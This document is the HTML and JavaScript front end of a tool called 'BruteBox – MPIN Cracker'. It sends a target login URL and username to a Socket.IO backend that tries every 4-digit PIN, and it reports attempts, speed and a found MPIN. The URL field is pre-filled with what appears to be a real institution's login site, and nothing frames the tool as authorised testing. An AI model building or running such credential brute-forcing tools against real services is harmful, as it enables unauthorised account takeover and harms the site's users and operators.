<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BruteBox – MPIN Cracker</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        .brutebox-logo { font-weight: bold; color: #007bff; }
        input, button { padding: 10px; margin: 5px 0; width: 100%; box-sizing: border-box; }
        button { background: #007bff; color: white; border: none; cursor: pointer; }
        button:disabled { background: #ccc; }
        #log { background: #1e1e1e; color: #0f0; padding: 10px; height: 300px; overflow-y: scroll; font-family: monospace; border-radius: 4px; }
        .info { margin-top: 20px; }
        .success { color: green; font-weight: bold; }
        .fail { color: red; font-weight: bold; }
        .progress { display: flex; justify-content: space-between; }
    </style>
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
</head>
<body>
    <div class="container">
        <h1>🔓 <span class="brutebox-logo">BruteBox</span> – MPIN Cracker</h1>
        <p>Enter the target login URL and username. BruteBox will attempt all 4‑digit PINs.</p>
        <input type="url" id="url" placeholder="https://example.com/login" value="https://ams.izeeinstitution.in/">
        <input type="text" id="username" placeholder="Username" value="">
        <div style="display: flex; gap: 10px;">
            <button id="startBtn" onclick="start()">▶ Start</button>
            <button id="stopBtn" onclick="stop()" disabled>⏹ Stop</button>
        </div>
        <div class="info">
            <p>Attempts: <span id="attempts">0</span> | Current PIN: <span id="current">-</span> | Elapsed: <span id="elapsed">0</span>s | Speed: <span id="speed">0</span>/s</p>
        </div>
        <div id="log"></div>
    </div>

    <script>
        const socket = io();
        const logDiv = document.getElementById('log');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');

        function log(message, isHtml = false) {
            const entry = document.createElement('div');
            if (isHtml) {
                entry.innerHTML = message;
            } else {
                entry.textContent = message;
            }
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        socket.on('connect', () => {
            log('✅ Connected to BruteBox server');
        });

        socket.on('log', (data) => {
            log(data.message);
        });

        socket.on('progress', (data) => {
            document.getElementById('attempts').textContent = data.attempts;
            document.getElementById('current').textContent = data.current;
            document.getElementById('elapsed').textContent = data.elapsed;
            document.getElementById('speed').textContent = data.speed;
        });

        socket.on('success', (data) => {
            log(`🎉 <span class="success">SUCCESS! MPIN: ${data.mpin}</span>`, true);
            log(`Attempts: ${data.attempts} | Time: ${data.elapsed}s`, true);
            startBtn.disabled = false;
            stopBtn.disabled = true;
        });

        socket.on('fail', (data) => {
            log(`❌ <span class="fail">MPIN not found</span>`, true);
            log(`Attempts: ${data.attempts} | Time: ${data.elapsed}s`, true);
            startBtn.disabled = false;
            stopBtn.disabled = true;
        });

        socket.on('error', (data) => {
            log(`⚠️ Error: ${data.message}`);
            startBtn.disabled = false;
            stopBtn.disabled = true;
        });

        function start() {
            const url = document.getElementById('url').value.trim();
            const username = document.getElementById('username').value.trim();
            if (!url || !username) {
                alert('Please enter both URL and username');
                return;
            }
            // Clear previous log
            logDiv.innerHTML = '';
            log('🚀 Starting brute force with BruteBox...');
            socket.emit('start_bruteforce', { url, username });
            startBtn.disabled = true;
            stopBtn.disabled = false;
        }

        function stop() {
            socket.emit('stop_bruteforce');
            startBtn.disabled = false;
            stopBtn.disabled = true;
            log('⏸ Stopping...');
        }
    </script>
</body>
</html>
